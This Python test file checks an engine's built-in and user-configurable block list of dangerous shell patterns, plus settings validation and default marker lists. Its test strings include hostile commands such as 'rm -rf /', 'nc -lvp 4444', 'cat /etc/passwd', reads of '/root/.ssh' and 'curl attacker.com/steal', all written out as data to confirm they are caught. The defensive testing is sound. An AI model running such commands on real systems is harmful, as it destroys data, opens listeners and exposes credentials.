"""Tests for configurable dangerous shell patterns — AC-R08.

Verifies:
- Builtin patterns are always present and cannot be removed
- User-configured extras are appended (append-only model)
- Combined regex is compiled correctly
- Known dangerous commands are caught
- Safe commands are not blocked
"""

from __future__ import annotations

import re

import pytest


class TestBuiltinDangerousPatterns:
    """AC-R08: 内置安全模式不可移除。"""

    def test_builtin_patterns_exist(self):
        """SlockEngine._BUILTIN_DANGEROUS_PATTERNS is defined and non-empty."""
        from src.slock_engine.engine import SlockEngine
        assert hasattr(SlockEngine, "_BUILTIN_DANGEROUS_PATTERNS")
        assert len(SlockEngine._BUILTIN_DANGEROUS_PATTERNS) >= 4

    def test_builtin_catches_rm_rf(self):
        """rm -rf is always caught by builtin patterns."""
        from src.slock_engine.engine import SlockEngine
        combined = re.compile(
            r"|".join(SlockEngine._BUILTIN_DANGEROUS_PATTERNS),
            re.IGNORECASE,
        )
        assert combined.search("rm -rf /")
        assert combined.search("; rm -rf /tmp")

    def test_builtin_catches_curl(self):
        """curl/wget are caught by builtin patterns."""
        from src.slock_engine.engine import SlockEngine
        combined = re.compile(
            r"|".join(SlockEngine._BUILTIN_DANGEROUS_PATTERNS),
            re.IGNORECASE,
        )
        assert combined.search("curl http://evil.com")
        assert combined.search("wget http://evil.com")

    def test_builtin_catches_netcat(self):
        """nc/ncat are caught by builtin patterns."""
        from src.slock_engine.engine import SlockEngine
        combined = re.compile(
            r"|".join(SlockEngine._BUILTIN_DANGEROUS_PATTERNS),
            re.IGNORECASE,
        )
        assert combined.search("nc -lvp 4444")
        assert combined.search("ncat target 80")

    def test_builtin_catches_sensitive_paths(self):
        """Access to /etc, /root, /proc, /sys, /dev is caught."""
        from src.slock_engine.engine import SlockEngine
        combined = re.compile(
            r"|".join(SlockEngine._BUILTIN_DANGEROUS_PATTERNS),
            re.IGNORECASE,
        )
        assert combined.search("cat /etc/passwd")
        assert combined.search("ls /root/.ssh")
        assert combined.search("cat /proc/1/environ")

    def test_safe_commands_not_blocked(self):
        """Normal safe commands should not trigger the patterns."""
        from src.slock_engine.engine import SlockEngine
        combined = re.compile(
            r"|".join(SlockEngine._BUILTIN_DANGEROUS_PATTERNS),
            re.IGNORECASE,
        )
        assert not combined.search("ls -la")
        assert not combined.search("python main.py")
        assert not combined.search("git status")
        assert not combined.search("echo hello")


class TestConfigurableExtraPatterns:
    """AC-R08: 用户可通过配置追加额外模式（追加模式）。"""

    def test_settings_field_exists(self):
        """slock_dangerous_shell_patterns field exists in settings."""
        from src.config.settings import Settings
        s = Settings()
        assert hasattr(s, "slock_dangerous_shell_patterns")
        assert isinstance(s.slock_dangerous_shell_patterns, list)

    def test_default_is_empty_list(self):
        """Default extra patterns is empty (only builtins active)."""
        from src.config.settings import Settings
        s = Settings()
        assert s.slock_dangerous_shell_patterns == []

    def test_extra_patterns_appended(self):
        """Extra patterns from config are appended to builtin patterns."""
        from src.slock_engine.engine import SlockEngine

        builtins = list(SlockEngine._BUILTIN_DANGEROUS_PATTERNS)
        extras = [r"docker\s+run", r"kubectl\s+delete"]
        all_patterns = builtins + extras
        combined = re.compile(r"|".join(all_patterns), re.IGNORECASE)

        # Extra patterns should now match
        assert combined.search("docker run --rm evil")
        assert combined.search("kubectl delete namespace prod")

        # Builtins still work
        assert combined.search("rm -rf /")

    def test_extra_cannot_remove_builtins(self):
        """Even if extras are empty, builtins remain."""
        from src.slock_engine.engine import SlockEngine

        builtins = list(SlockEngine._BUILTIN_DANGEROUS_PATTERNS)
        combined = re.compile(r"|".join(builtins), re.IGNORECASE)

        # Builtins always match dangerous commands
        assert combined.search("rm -rf /home")
        assert combined.search("curl attacker.com/steal")


class TestArbiterMaxTokensSetting:
    """AC-R08: slock_arbiter_max_tokens 配置验证。"""

    def test_default_value(self):
        """Default arbiter max tokens is 500."""
        from src.config.settings import Settings
        s = Settings()
        assert s.slock_arbiter_max_tokens == 500

    def test_min_constraint(self):
        """Value below 100 is rejected."""
        from pydantic import ValidationError

        from src.config.settings import Settings
        with pytest.raises(ValidationError):
            Settings(slock_arbiter_max_tokens=50)

    def test_max_constraint(self):
        """Value above 2000 is rejected."""
        from pydantic import ValidationError

        from src.config.settings import Settings
        with pytest.raises(ValidationError):
            Settings(slock_arbiter_max_tokens=3000)


class TestSettingsIndependentImport:
    """WP2: Settings 可独立导入，不依赖 slock_engine 模块。"""

    def test_settings_imports_without_slock_engine(self):
        """Settings 可以独立导入，不触发 slock_engine 导入链。

        这验证了修复：slock_uncertainty_markers 和 slock_convergence_signals
        不再使用动态 __import__ 从 slock_engine.discussion_manager 导入常量。
        """
        import subprocess
        import sys

        result = subprocess.run(
            [
                sys.executable,
                "-c",
                "from src.config.settings import Settings; s = Settings(); "
                "print('uncertainty:', len(s.slock_uncertainty_markers)); "
                "print('convergence:', len(s.slock_convergence_signals))",
            ],
            capture_output=True,
            text=True,
            cwd="/home/jiataorui/work/ghostAp",
        )

        assert result.returncode == 0, f"Import failed: {result.stderr}"
        assert "uncertainty:" in result.stdout
        assert "convergence:" in result.stdout

    def test_uncertainty_markers_default_values(self):
        """slock_uncertainty_markers 默认值与 discussion_manager.py 保持一致。"""
        from src.config.settings import Settings

        s = Settings()
        markers = set(s.slock_uncertainty_markers)

        expected = {
            "不确定", "需要确认", "需要讨论", "needs review", "需要审查",
            "not sure", "i'm not sure", "uncertain", "maybe", "可能", "也许",
        }
        assert markers == expected, f"Expected {expected}, got {markers}"

    def test_convergence_signals_default_values(self):
        """slock_convergence_signals 默认值与 discussion_manager.py 保持一致。"""
        from src.config.settings import Settings

        s = Settings()
        signals = set(s.slock_convergence_signals)

        expected = {
            "AGREE", "LGTM", "同意", "认可", "没问题",
            "looks good", "sounds good", "no further suggestions",
        }
        assert signals == expected, f"Expected {expected}, got {signals}"

    def test_markers_are_list_type(self):
        """默认值应为 list 类型（Pydantic 字段声明为 list[str]）。"""
        from src.config.settings import Settings

        s = Settings()
        assert isinstance(s.slock_uncertainty_markers, list)
        assert isinstance(s.slock_convergence_signals, list)

    def test_markers_are_mutable_copies(self):
        """每次实例化应获得独立的列表副本，避免共享状态。"""
        from src.config.settings import Settings

        s1 = Settings()
        s2 = Settings()

        # 修改 s1 的列表不应影响 s2
        s1.slock_uncertainty_markers.append("custom_marker")
        assert "custom_marker" not in s2.slock_uncertainty_markers
